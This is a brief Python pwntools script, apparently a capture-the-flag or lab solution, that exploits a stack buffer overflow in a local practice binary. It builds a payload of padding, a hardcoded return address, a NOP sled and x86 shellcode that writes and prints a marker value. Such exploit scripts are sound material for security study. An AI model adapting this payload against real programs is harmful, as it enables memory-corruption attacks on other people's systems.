from pwn import *

#context(log_level = 'debug')
p = process('./YY_IO_BS_003_ROP')
raw_input()

print p.recv()
#write to memory
shellcode = '\xb8\x40\xa0\x0e\x08\xbb\x41\x42\x43\x44\x89\x18'
#read memory
shellcode += '\x31\xd2\xb2\x04\xb9\x40\xa0\x0e\x08\x31\xdb\xb3\x01\x31\xc0\xb0\x04\xcd\x80'
payload = '0'*23 + p32(0xffffd3a0) + '\x90'*(128-23-len(shellcode)) + shellcode

p.send(payload)
print p.recv()
